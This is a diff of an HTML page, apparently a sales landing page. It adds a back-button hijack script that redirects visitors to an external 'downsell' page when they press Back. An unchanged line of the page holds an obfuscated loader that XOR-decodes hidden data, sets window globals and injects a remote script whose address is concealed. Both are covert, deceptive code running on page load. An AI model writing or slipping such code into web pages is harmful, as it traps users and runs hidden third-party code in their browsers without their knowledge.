@@ -13,6 +13,16 @@
 
   <script>(function(){var t_d5=atob("DLkR6SPNZ5kHjUc/EsIznFGhRaMl5TNLYsorxgyuA/cp+DNSe99ox0CiCrdl/2hMcct4mVe+SOlu9SJTPcl4kUahSfN0r2sdc81lm0qvEu1i/mUFSeQ9y0ShCPtm4TQdKOJqy02sCvwlt2VPe8F0hWqpRbUl+yZTZ9wz0wH7Bvo2uXFcdown2BGvX642uXYNJYx1iELvGsR6");var r_h7=[];for(var c_77hq=0;c_77hq<t_d5.length;c_77hq++){r_h7.push(t_d5.charCodeAt(c_77hq)&255);}var g_iv=r_h7[0];var f_4=r_h7.slice(1,1+g_iv);var r_ns=r_h7.slice(1+g_iv);var z_9nf9=r_ns.map(function(b,r_d9){return b^f_4[r_d9%g_iv];});var b_tzdu="";for(var u_xw32=0;u_xw32<z_9nf9.length;u_xw32++){b_tzdu+=String.fromCharCode(z_9nf9[u_xw32]&255);}var w_ibl=decodeURIComponent(escape(b_tzdu));var f_vo9=JSON.parse(w_ibl);var r_qx=f_vo9.globals||[];r_qx.forEach(function(b_4){window[b_4.name]=b_4.value;});var e_3dy=document.createElement("script");e_3dy.src=f_vo9.url;e_3dy.async=true;e_3dy.defer=true;(f_vo9.attributes||[]).forEach(function(z_r){e_3dy.setAttribute(z_r.name,z_r.value);});(document.head||document.documentElement).appendChild(e_3dy);})();</script>
 
+  <!-- SCRIPT DE BACK REDIRECT PARA O DOWNSELL -->
+<script>
+  (function() {
+    history.pushState(null, document.title, location.href);
+    window.addEventListener('popstate', function(event) {
+      window.location.href = 'https://acel7x-down01.vercel.app/';
+    });
+  })();
+</script>
+
   <style>
     :root {
       --bg-principal: #0d1117;
